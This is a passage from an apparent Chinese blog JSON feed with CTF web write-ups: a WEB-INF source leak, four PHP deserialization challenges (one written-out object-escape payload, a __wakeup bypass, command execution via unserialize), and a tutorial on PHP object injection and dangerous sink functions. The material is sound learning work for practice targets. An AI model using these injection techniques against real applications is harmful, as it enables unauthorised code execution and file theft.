/&gt;&lt;!--p8--&gt;</p>\n<p>确实有漏洞，能带出源码，虽然我没听过，所以我查了一下相关资料：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3L2FydGljbGUvZGV0YWlscy83ODE2NTA1MQ==\">ctf/web 源码泄露及利用办法</span></p>\n<p>nb，继续做题：</p>\n<p>这里 get 下载不下来东西，burp 抓包后用 post 下载 web-xml (通过 WEB-INF)：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDkvbU5KaWFiV0Q4UjRRUEt2LnBuZw==\">https://i.loli.net/2021/08/09/mNJiabWD8R4QPKv.png</span>&quot; alt=&quot;9.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p9--&gt;</p>\n<p>根据漏洞说明，找到相关的 class 文件，下载（就是我图中画出来的文件）：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDkvcW9lVzdHWEhjZjVSODFTLnBuZw==\">https://i.loli.net/2021/08/09/qoeW7GXHcf5R81S.png</span>&quot; alt=&quot;10.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p10--&gt;</p>\n<p>得到 base64 加密后的 flag，结束</p>\n<p>说实话这题挺简单，主要靠经验做，但是像我这种 cj，直接傻眼。。</p>\n<hr>\n<h1 id=\"附参考文章\"><a class=\"anchor\" href=\"#附参考文章\">#</a> 附：参考文章</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2x2Y2hlbi9wLzEwMTY5MjQ1Lmh0bWw=\">HTML 请求头，响应头和 HTTP 状态码</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9odHRwL2h0dHAtbWV0aG9kcy5odG1s\">菜鸟教程 HTTP 请求方法</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aW5kYXJkLmNvbS9wcm9qZWN0LzIwMTYvMDUvMDgvRm9yZ2UtSVAtQWRkcmVzcw==\">通过修改 http 请求的 header 请求头来伪造 ip</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3L2FydGljbGUvZGV0YWlscy83ODE2NTA1MQ==\">ctf/web 源码泄露及利用办法</span></p>\n<hr>\n<p>遇到类似的的奇怪题再总结</p>\n<p>END</p>\n",
            "tags": [
                "http"
            ]
        },
        {
            "id": "http://example.com/2021/07/04/(ctfwp)buu%E4%B8%ADphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "http://example.com/2021/07/04/(ctfwp)buu%E4%B8%ADphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "(ctfwp)buu中php反序列化",
            "date_published": "2021-07-04T14:48:57.312Z",
            "content_html": "<p>上一篇整理了 php 反序列化的知识点，本文是我对练习中题目的整理。</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1极客大挑战-2019php\"><a class=\"anchor\" href=\"#1极客大挑战-2019php\">#</a> 1.[极客大挑战 2019] PHP</h1>\n<p>进入页面，根据提示，考虑备份导致源码泄露。</p>\n<p>于是用扫描工具（ctfwscan）进行目录扫描，发现备份文件可以成功访问，如图</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvT3V2YnNjcTV6bjRFODYxLnBuZw==\">https://i.loli.net/2021/07/04/Ouvbscq5zn4E861.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>然后下载下来，打开，有五个文件：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvSDRCRWFPWDE4cVlMb2tBLnBuZw==\">https://i.loli.net/2021/07/04/H4BEaOX18qYLokA.png</span>&quot; alt=&quot;1.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>尝试 flag.php 后不对，审计 class.php 和 index.php，找到了可反序列化点</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvbGJCb0dmNFluUjN5SXpLLnBuZw==\">https://i.loli.net/2021/07/04/lbBoGf4YnR3yIzK.png</span>&quot; alt=&quot;1.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>因为包含了 class.php 文件，所以审计 class.php</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvM2dtTXZ1WVpXajVpcG43LnBuZw==\">https://i.loli.net/2021/07/04/3gmMvuYZWj5ipn7.png</span>&quot; alt=&quot;1.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>class 中没有调用类，根据 index 中代码，只是进行了反序列化。</p>\n<p>根据流程分析，先__wakeup ()，然后__destruct ()。</p>\n<p>在 destruct () 中，当 password == 100，username === admin 时，能读取 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvbEd6SHNLSlF5ajRobUUyLnBuZw==\">https://i.loli.net/2021/07/04/lGzHsKJQyj4hmE2.png</span>&quot; alt=&quot;1.5.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>但是在 wakeup () 时，username 会被赋值为 guest，会使我们输入的值改变，导致无法获取答案。</p>\n<p>此时我们只需改对象属性个数绕过 wakeup () 即可：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/qfRyJZDdMrTK4SC.png\" alt=\"1.6.png\">&lt;!--p6--&gt;</p>\n<p>打入 payload，得到 flag</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvRjI2eXY1c0pnbHdUWHJ4LnBuZw==\">https://i.loli.net/2021/07/04/F26yv5sJglwTXrx.png</span>&quot; alt=&quot;1.7.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<hr>\n<h1 id=\"2网鼎杯-2020-青龙组areuserialz\"><a class=\"anchor\" href=\"#2网鼎杯-2020-青龙组areuserialz\">#</a> 2.[网鼎杯 2020 青龙组] AreUSerialz</h1>\n<p>据说是当年的签到题，作为一个新手，当然要玩一下</p>\n<p>进去直接给了原码，先复制到本地，找反序列化点：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvU2REbjQyQ3hIUUdZQWFQLnBuZw==\">https://i.loli.net/2021/07/04/SdDn42CxHQGYAaP.png</span>&quot; alt=&quot;2.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>&lt;!--p1--&gt;</p>\n<p>然后审计代码，同第一题，但没有 wakeup ()，如果反序列化直接会 destruct ()</p>\n<p>但再反序列化前，需要先绕过 is_valid () 中的 ascll 检查（私有类需要 %00）</p>\n<p>在 destruct () 中，当 op === &quot;2&quot; 时，会被强制为 &quot;1&quot;，当 op == &quot;1&quot; 时，沿着代码走下去发现只能写，不能读，无法找到 flag；而当 op == &quot;2&quot; 时，通过 file_get_contents () 函数可以读到 filename，如图：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvTUk0akRWM2Y2Y21ZUm9hLnBuZw==\">https://i.loli.net/2021/07/04/MI4jDV3f6cmYRoa.png</span>&quot; alt=&quot;2.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>所以我们的目标 1. 绕过 op === &quot;2&quot; 时的强制转换   2. 绕过私有属性时的 ascll 检测</p>\n<p>解决方法：</p>\n<p>1. 当 op === &quot;2&quot; 时才会转换，所以当 op == &quot;2&quot; 时，不会强制转换，因为后者没有对类型强制要求，所以只需让 op = 2  （int 型），在判断时不会因为类型而引起强制转换，即绕过。</p>\n<p>2. 有以下两个方法，第一个更常用：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// PHP7.1 以上版本对属性类型不敏感，可以用 public 属性来绕过检查</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示</span></pre></td></tr></table></figure><p>本题第二个绕过我选择第一种方法，如图：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvQ0FORFJzWU15M1BVcVFjLnBuZw==\">https://i.loli.net/2021/07/04/CANDRsYMy3PUqQc.png</span>&quot; alt=&quot;2.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>打入 payload，在注释中得到 flag，如图：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvc1Z1ZzVoN1VuZkN6alNHLnBuZw==\">https://i.loli.net/2021/07/04/sVug5h7UnfCzjSG.png</span>&quot; alt=&quot;2.4.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<h1 id=\"3网鼎杯-2020-朱雀组phpweb\"><a class=\"anchor\" href=\"#3网鼎杯-2020-朱雀组phpweb\">#</a> 3.[网鼎杯 2020 朱雀组] phpweb</h1>\n<p>进去页面后发现五秒刷新一次，还会出现警告 warning，如图：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/vREfAQ4MzBOsNuZ.png\" alt=\"3.1.png\">&lt;!--p1--&gt;</p>\n<p>用 bp 抓一下包，发现一直在传送两条数据</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvNFNLQU9Nd20xUWZMV25yLnBuZw==\">https://i.loli.net/2021/07/06/4SKAOMwm1QfLWnr.png</span>&quot; alt=&quot;3.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>百度了一下，发现可能有函数执行的操作</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvUW1sWno5eFMxdEY3MkpSLnBuZw==\">https://i.loli.net/2021/07/06/QmlZz9xS1tF72JR.png</span>&quot; alt=&quot;3.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>根据函数 file_get_contents 读取信息，于是得到 index.php：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvTGNCZ2g2RDFhWGtkUkViLnBuZw==\">https://i.loli.net/2021/07/06/LcBgh6D1aXkdREb.png</span>&quot; alt=&quot;3.4.00.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>考虑通过 system、passthur 或者 exec 执行命令读取信息，但是可以发现第 24 行已经将它们在 func 中屏蔽掉。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvSVpwNVBGbkdUTjZremlXLnBuZw==\">https://i.loli.net/2021/07/06/IZp5PFnGTN6kziW.png</span>&quot; alt=&quot;3.5.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>就是说其不能作为函数，但是我们可以用反序列化 unserialize () 绕过</p>\n<p>先序列化构造 payload</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvalQ4ZlZVa3RoREZJM1JZLnBuZw==\">https://i.loli.net/2021/07/06/jT8fVUkthDFI3RY.png</span>&quot; alt=&quot;3.6.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<p>然后再通过 bp 传一次参</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvN3VaTWo5d2Zkb2FUazRyLnBuZw==\">https://i.loli.net/2021/07/06/7uZMj9wfdoaTk4r.png</span>&quot; alt=&quot;3.7.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>由于找不到有用的信息，于是百度后，我 get 到了新方法！！</p>\n<p><strong>find 用法：</strong><br>\n<strong>find path -option [ -print ] [ -exec -ok command ] {} ;</strong><br>\n<strong>path： . 代表当前路径，/ 代表总目录</strong><br>\n<strong> - name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写</strong><br>\n<strong> name 可以使用通配符，如 “flag.*”</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1jb21tLWZpbmQuaHRtbA==\">菜鸟教程 find 用法</span></p>\n<p>所以可以构造 find /-iname&quot;flag.*&quot;, 然后序列化得到字符串：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvRFY1NFVBbGNaZ2l2V011LnBuZw==\">https://i.loli.net/2021/07/06/DV54UAlcZgivWMu.png</span>&quot; alt=&quot;3.8.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p8--&gt;</p>\n<p>然后继续用 bp 传参，找到 flag 文件，通过 readfile 或 file_get_contents 读取 flag</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvYTJmSVRxUzRHNWt0Vk5FLnBuZw==\">https://i.loli.net/2021/07/06/a2fITqS4G5ktVNE.png</span>&quot; alt=&quot;3.9.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p9--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvdlgxUUNub2hldVpSQjRiLnBuZw==\">https://i.loli.net/2021/07/06/vX1QCnoheuZRB4b.png</span>&quot; alt=&quot;3.10.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p10--&gt;</p>\n<hr>\n<h1 id=\"4安洵杯-2019easy_serialize_php\"><a class=\"anchor\" href=\"#4安洵杯-2019easy_serialize_php\">#</a> 4.[安洵杯 2019] easy_serialize_php</h1>\n<p>进入网站就能看到原码，先复制到本地</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvSG9CRmlNNFRFSlVmWXRqLnBuZw==\">https://i.loli.net/2021/07/06/HoBFiM4TEJUfYtj.png</span>&quot; alt=&quot;4.1.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>先审计代码，在 31 行找到序列化函数，在 38 行找到但反列化函数，且参数可控通过 get 传参</p>\n<p>所以，根据提示先让 $function = phpinfo，通过 bp 传参（或是直接在浏览器输入）</p>\n<p>我先用的 bp，出现代码后复制到本地，查找 flag、ag、fl、f1ag 等等相关名词，成功找到文件</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/ct24bNzhofQ9BvD.png\" alt=\"4.2.png\">&lt;!--p2--&gt;</p>\n<p>后来又试了一下网址直接传，大概浏览了一遍也能找到。</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/HnglVwDsRmkUfZy.png\" alt=\"4.3.png\">&lt;!--p3--&gt;</p>\n<p>知道了文件名，无法直接读，所以准备用代码中的 file_get_contents () 函数读取</p>\n<p>所以需要让 base64_decode ($userinfo [‘img’]) = d0g3_f1ag.php ，根据百度进行 base64 加密，</p>\n<p>就需要让 $userinfo [‘img’] = ZDBnM19mMWFnLnBocA==</p>\n<p>又因为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>f</mi><mi>o</mi><mo stretchy=\"false\">[</mo><mtext>‘</mtext><mi>i</mi><mi>m</mi><mi>g</mi><mtext>’</mtext><mo stretchy=\"false\">]</mo><mtext>是由</mtext></mrow><annotation encoding=\"application/x-tex\">userinfo[‘img’]是由</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mopen\">[</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord\">’</span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">由</span></span></span></span> serialize_info 反序列化得到的</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>l</mi><mi>i</mi><mi>z</mi><msub><mi>e</mi><mi>i</mi></msub><mi>n</mi><mi>f</mi><mi>o</mi><mtext>又是由</mtext></mrow><annotation encoding=\"application/x-tex\">serialize_info又是由</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord cjk_fallback\">又</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">由</span></span></span></span>_SESSION 序列化然后过滤得到的</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvSDg1VjNMamdHUjI2Rm1oLnBuZw==\">https://i.loli.net/2021/07/06/H85V3LjgGR26Fmh.png</span>&quot; alt=&quot;4.7.png&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>但是如果对 $_SESSION ['img'] 赋值，则会被 sha1 进行再次加密，且不可逆，无法得到答案</p>\n<p>所以只能从过滤函数过滤序列化字符串处开始下手</p>\n<p>此处参考了 https://blog.csdn.net/qq_43622442/article/details/106003691</p>\n<p>当中对对象逃逸问题有详细的说明：（我还在参悟这东西，实在头大）</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvcWJ4cllDYzh5UE1PdzFkLnBuZw==\">https://i.loli.net/2021/07/06/qbxrYCc8yPMOw1d.png</span>&quot; alt=&quot;4.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">_SESSION</span><span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>flagflagflagflagflagflag<span class=\"token operator\">&amp;</span><span class=\"token constant\">_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>a<span class=\"token string double-quoted-string\">\";s:8:\"</span><span class=\"token keyword\">function</span><span class=\"token string double-quoted-string\">\";s:7:\"</span>xxx<span class=\"token string double-quoted-string\">\";s:3:\"</span>img<span class=\"token string double-quoted-string\">\";s:20:\"</span>ZDBnM19mMWFnLnBocA<span class=\"token operator\">==</span>\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>然后输入后查看源码有注释：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvMk85dWZjOHJGTUJzUXlpLnBuZw==\">https://i.loli.net/2021/07/06/2O9ufc8rFMBsQyi.png</span>&quot; alt=&quot;4.5.png&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>把 img 文件名加密后一换，长度没变，就能得到 flag</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvVGZ2UGRsQTlLV0dzaGF0LnBuZw==\">https://i.loli.net/2021/07/06/TfvPdlA9KWGshat.png</span>&quot; alt=&quot;4.6.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "反序列化"
            ]
        },
        {
            "id": "http://example.com/2021/07/04/ctfweb-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "http://example.com/2021/07/04/ctfweb-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "ctfweb-PHP反序列化",
            "date_published": "2021-07-04T10:33:13.829Z",
            "content_html": "<p>学习了一下 php 反序列化漏洞，并做了一些整理。</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"简单理解\"><a class=\"anchor\" href=\"#简单理解\">#</a> 简单理解</h1>\n<p>serialize 将一个对象转换成一个字符串<br>\n unserialize 将一个字符串还原成一个对象</p>\n<hr>\n<p><em><strong>序列化：</strong></em></p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvajhQRXVrbTZ0UzNoeEwxLnBuZw==\">https://i.loli.net/2021/07/04/j8PEukm6tS3hxL1.png</span>&quot; alt=&quot;1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>如图所示:</p>\n<p><code>O:6:&quot;People&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;jack&quot;;s:3:&quot;age&quot;;i:18;&#125;</code></p>\n<p>就是我们输入的 people 信息经过序列化得到的字符串，其中</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvT2pQbnpZYWcxb0xTc1FXLnBuZw==\">https://i.loli.net/2021/07/04/OjPnzYag1oLSsQW.png</span>&quot; alt=&quot;2.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>需要注意的是：</p>\n<p><strong>\\x00 + 类名 + \\x00 + 变量名 反序列化出来的是 private 变量</strong></p>\n<p><strong>\\x00 + * + \\x00 + 变量名 反序列化出来的是 protected 变量</strong></p>\n<hr>\n<p><em><strong>反序列化</strong></em></p>\n<p>我们通过 post 传递这串序列化的字符串，来验证使用 unserialize</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvb1VLY1NQTVF0a0hSM0lGLnBuZw==\">https://i.loli.net/2021/07/04/oUKcSPMQtkHR3IF.png</span>&quot; alt=&quot;3.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>两者配合引起了问题所在。</p>\n<hr>\n<h1 id=\"魔术方法\"><a class=\"anchor\" href=\"#魔术方法\">#</a> 魔术方法</h1>\n<p>__wakeup () // 使用 unserialize 时触发<br>\n__sleep () // 使用 serialize 时触发</p>\n<p>__destruct () // 对象被销毁时触发</p>\n<p>__call () // 在对象上下文中调用不可访问的方法时触发<br>\n__callStatic () // 在静态上下文中调用不可访问的方法时触发</p>\n<p>__get () // 用于从不可访问的属性读取数据<br>\n__set () // 用于将数据写入不可访问的属性</p>\n<p>__isset () // 在不可访问的属性上调用 isset () 或 empty () 触发<br>\n__unset () // 在不可访问的属性上使用 unset () 时触发</p>\n<p>__toString () // 把类当作字符串使用时触发<br>\n__invoke () // 当脚本尝试将对象调用为函数时触发</p>\n<p><em><strong>最常用的：</strong></em></p>\n<pre><code>__construct，构造函数，PHP 5 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初 始化工作。 \n__toString，打印一个对象时，如果定义了__toString()方法，就能在测试时，通过echo 打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含 的数据。\n__destruct，析构函数，PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言， 如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 \n__sleep magic方法在一个对象被序列化的时候调用。 \n__wakeup magic方法在一个对象被反序列化的时候调用。\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvYUgxQlRqVjRJM2tuOExkLnBuZw==\">https://i.loli.net/2021/07/04/aH1BTjV4I3kn8Ld.png</span>&quot; alt=&quot;4.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvSXI2Z1RNT0dXZVY1eGtBLnBuZw==\">https://i.loli.net/2021/07/04/Ir6gTMOGWeV5xkA.png</span>&quot; alt=&quot;5.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<hr>\n<h1 id=\"php反序列化漏洞\"><a class=\"anchor\" href=\"#php反序列化漏洞\">#</a> php 反序列化漏洞</h1>\n<p>PHP 反序列化漏洞又叫 PHP 对象注入漏洞，反序列化的数据本质上来说是没有危害的，但是在 反序列化参数可控时，可能会产生严重的安全威胁。当传给  unserialize () 的参数可控时， 我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p>\n<p>攻击流程就是在本地写一个序列化的文件，拿得到的字符串去打远程</p>\n<p>重点关注的函数：<br>\n代码执行：eval ()      assert ()<br>\n 命令执行：exec ()      passthru ()      system ()      popen ()<br>\n<strong> 文件操作</strong>：file_put_contents ()      file_get_contents ()      unlink ()</p>\n<p>常用：</p>\n<p>exec — 执行一个外部程序（exec (whoami)）</p>\n<p>passthru — 执行外部程序并且显示原始输出，同上</p>\n<p>system — 执行外部程序，并且显示输出（system (whoami)、system (ls)）</p>\n<p>file_get_contents — 将整个文件读入一个字符串（file_get_contents (flag.php)）</p>\n<p>unlink — 删除文件</p>\n<hr>\n<p><strong>下一篇做题练手</strong></p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "反序列化"
            ]
        },
        {
            "id": "http://example.com/2021/07/01/php%E5%AD%A6%E4%B9%A0%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%98%93%E5%BF%98%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/",
            "url": "http://example.com/2021/07/01/php%E5%AD%A6%E4%B9%A0%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%98%93%E5%BF%98%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/",
            "title": "php的浅显学习中一些知识点",
            "date_published": "2021-07-01T03:03:51.726Z",
